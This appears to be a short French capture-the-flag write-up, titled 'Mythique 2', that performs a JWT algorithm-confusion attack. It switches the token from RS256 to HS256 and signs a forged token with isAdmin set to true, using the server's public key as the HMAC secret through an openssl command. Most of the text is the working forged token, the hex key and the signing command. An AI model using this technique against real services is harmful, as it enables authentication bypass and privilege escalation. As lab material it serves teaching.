## Mythique 2

première étape récupérer la clé publique

```KEY
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqLkYHUSPJYmg4LcJIFKD
5An8sSdOXNUftIyEsHFbmQGK/nQvHjdUE0UlJlUeg0rpfllqZqaqe+ScImvdNsu5
X+KlOKgSg4xLeqiToDEIoU1vAU2D11gMWn+1e8Ht9l+T47c09rbZKuTYXGsy02tw
hJkdQ7KeuwMmMuXCVsE5dZUF6pgjRW9M5PVpEW9nWqTOqCsrK7EVxursCUAd+hvN
tTh4y+la9eDG7djDs1QQBwmnNzFeK6I6YSVMeLcsttxGi5lMQyc/iGkNSVtblxoq
jOFlxkOl1C9gpyuD7ECCLrcBvipdjDi6n5s8/3NTLxM2o9KCMWcQ4vMr+UNWQq6k
YQIDAQAB
-----END PUBLIC KEY-----

```

Récupérer le JWT et on va utiliser le vecteur d'attaque de changement de signature. Nous allons passer de RS256 à H256 et utiliser la clé publique pour générer notre propre signature.
On modifie le token pour mettre **isAdmin** à true

```JWT
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NzEyNzg2NDMsImRhdGEiOnsibmFtZSI6IlpvYiDDgCBQb2lsIiwiaXNBZG1pbiI6dHJ1ZX0sImlhdCI6MTY3MTI3NTA0M30.CkWsbhdomgdUdy-xFiH0DFn16yBeZ8c656_OcvJMabU
```

On récupère ce token avec les informations suivantes
```JSON
{
  "exp": 1671278643,
  "data": {
    "name": "Zob À Poil",
    "isAdmin": true
  },
  "iat": 1671275043
}
```

On encode maintenant la clé publique en hexa pour plus tard générer notre signature avec openssl

```HEX
2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541714c6b59485553504a596d67344c634a49464b440a35416e387353644f584e556674497945734846626d51474b2f6e5176486a64554530556c4a6c556567307270666c6c715a716171652b5363496d76644e7375350a582b4b6c4f4b67536734784c657169546f4445496f553176415532443131674d576e2b3165384874396c2b54343763303972625a4b75545958477379303274770a684a6b6451374b6575774d6d4d75584356734535645a55463670676a5257394d355056704557396e5771544f714373724b37455678757273435541642b68764e0a74546834792b6c613965444737646a447331515142776d6e4e7a46654b3649365953564d654c63737474784769356c4d5179632f69476b4e535674626c786f710a6a4f466c786b4f6c3143396770797544374543434c726342766970646a4469366e3573382f334e544c784d326f394b434d57635134764d722b554e575171366b0a59514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
```

```SHELL
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NzEyNzg2NDMsImRhdGEiOnsibmFtZSI6IlpvYiDDgCBQb2lsIiwiaXNBZG1pbiI6dHJ1ZX0sImlhdCI6MTY3MTI3NTA0M30" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541714c6b59485553504a596d67344c634a49464b440a35416e387353644f584e556674497945734846626d51474b2f6e5176486a64554530556c4a6c556567307270666c6c715a716171652b5363496d76644e7375350a582b4b6c4f4b67536734784c657169546f4445496f553176415532443131674d576e2b3165384874396c2b54343763303972625a4b75545958477379303274770a684a6b6451374b6575774d6d4d75584356734535645a55463670676a5257394d355056704557396e5771544f714373724b37455678757273435541642b68764e0a74546834792b6c613965444737646a447331515142776d6e4e7a46654b3649365953564d654c63737474784769356c4d5179632f69476b4e535674626c786f710a6a4f466c786b4f6c3143396770797544374543434c726342766970646a4469366e3573382f334e544c784d326f394b434d57635134764d722b554e575171366b0a59514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
```

```SHELL
a1b9b29b9ba430e866da9a6758c0541894bc2fc711f433faa79285aae009bc71
```
```
